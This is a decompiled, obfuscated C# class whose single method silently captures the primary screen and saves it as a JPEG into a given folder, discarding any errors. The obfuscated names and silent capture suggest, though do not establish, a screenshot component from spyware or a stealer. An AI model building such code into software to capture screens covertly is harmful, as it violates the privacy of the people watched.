using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

// Token: 0x02000052 RID: 82
internal class Class21
{
	// Token: 0x0600022A RID: 554 RVA: 0x00011200 File Offset: 0x0000F400
	public static void smethod_0(string string_0)
	{
		try
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap bitmap = new Bitmap(width, height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(string_0 + "\\Screen.Jpeg", ImageFormat.Jpeg);
		}
		catch
		{
		}
	}

	// Token: 0x0600022B RID: 555 RVA: 0x0000446C File Offset: 0x0000266C
	public Class21()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}
}
